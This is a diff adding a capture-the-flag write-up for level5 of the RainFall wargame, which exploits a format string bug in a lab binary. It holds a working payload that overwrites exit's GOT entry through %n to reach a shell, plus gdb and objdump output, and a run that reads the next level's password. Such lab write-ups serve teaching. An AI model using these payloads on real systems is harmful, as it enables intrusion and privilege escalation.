@@ -181,3 +181,83 @@ We need to call o function where system with string "/bin/sh" is called. It is n
 	   0x080484a4 <+0>:	push   ebp
 
 On this level we deal with format string exploits in `printf(buffer)`. It was difficult for understanding.\
+
+String for `printf` lies on the stack and with the help of format string we can look at the stack without gdb:
+
+	level5@RainFall:~$ ./level5
+		AAAABBBBCCCC %08x %08x %08x %08x %08x
+		0           1         2        3        4  
+		AAAABBBBCCCC 00000200 b7fd1ac0 b7ff37d0 41414141 42424242 
+
+Where our AAA string starts from the **fourth** `printf` argument (as in level3).\
+In order to come to the 4th argument directly there is a $ opportunity in formatting string.\
+So we can rewrite address of the global variable to the buffer. And then in order to change value of the variable we need to use %n: 
+
+> There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice.
+
+So before %n we need to have some number of bytes in the string. But which number? We need to rewrite address to 0x080484a4.\
+The problem is that with formatting string we need to write exact number of bytes to the address in order to exploit the binary. I believe that there are better ways to do that but I am too lazy sooooo: 0x080484a4 is 134513828 in decimal. Let's do that as:
+
+	level5@RainFall:~$ python -c 'print "????" + "%134513824u" + "%4$n"' > /tmp/lev5
+
+But what address do we replace? We said that it should be `exit` address. Let's find it out:
+
+	(gdb) disass n
+	Dump of assembler code for function n:
+	   0x080484c2 <+0>:	push   ebp
+	   0x080484c3 <+1>:	mov    ebp,esp
+	   0x080484c5 <+3>:	sub    esp,0x218
+	   0x080484cb <+9>:	mov    eax,ds:0x8049848
+	   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
+	   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+	   0x080484dc <+26>:	lea    eax,[ebp-0x208]
+	   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
+	   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+	   0x080484ea <+40>:	lea    eax,[ebp-0x208]
+	   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
+	   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+	   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
+	=> 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+If we look to the objdump result we see in section .plt the following:
+
+	080483d0 <exit@plt>:
+		80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
+		80483d6:	68 28 00 00 00       	push   0x28
+		80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
+
+That means that by calling 0x80483d0 address we jump to the 0x8049838 address. Why and how is explained here: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html. The main idea is that we need 0x8049838 address that is \x38\x98\x04\x08 is little-endian.\
+So finally we have (not a very good method, ther will be a lot of spaces):
+
+	level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824u" + "%4$n"' > /tmp/lev5
+
+Where functionally:
+
+	- \x38\x98\x04\x08 - address of the real exit functions that is called
+	- %134513824u - alignment with spaces so that we have necessary number of bytes
+	- "%4$n" that rewrites value of the 4th argument under address that lies in the beginning of the buffer
+
+Where bytes number:
+
+	- \x38\x98\x04\x08 - 4 bytes
+	- %134513824u - 134513824 spaces, we do not print anything with this printf so there will be only spaces
+
+That equals 134513828 bytes.
+
+It is very difficult to understand it if you do not play with the line and look on gdb.
+
+# Result
+
+	level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824u" + "%4$n"' > /tmp/lev5
+	level5@RainFall:~$ cat /tmp/lev5 - | ./level5
+
+
+
+ 	                                                                     512
+	whoami
+	level6
+	cat /home/user/level6/.pass
+	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+	^C
+
+Why do we use `cat -` command? Because even if we break the level and call system, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.
